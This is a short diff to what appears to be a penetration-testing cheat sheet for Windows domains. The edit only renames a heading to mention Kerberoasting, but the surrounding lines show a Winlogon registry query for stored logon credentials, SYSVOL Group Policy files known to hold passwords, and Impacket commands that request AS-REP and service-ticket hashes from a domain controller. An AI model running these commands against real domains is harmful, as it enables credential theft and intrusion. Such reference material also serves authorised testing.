@@ -606,7 +606,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
 Look for XML files such as Drives.xml, DataSources.xml, Groups.xml, Printers.xml, ScheduledTasks.xml...
 
-#TGT Services
+#TGT Services/Kerberoasting
 Impacket tools 
 ./GetNPUsers.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request
 ./GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip 10.10.10.100 -request
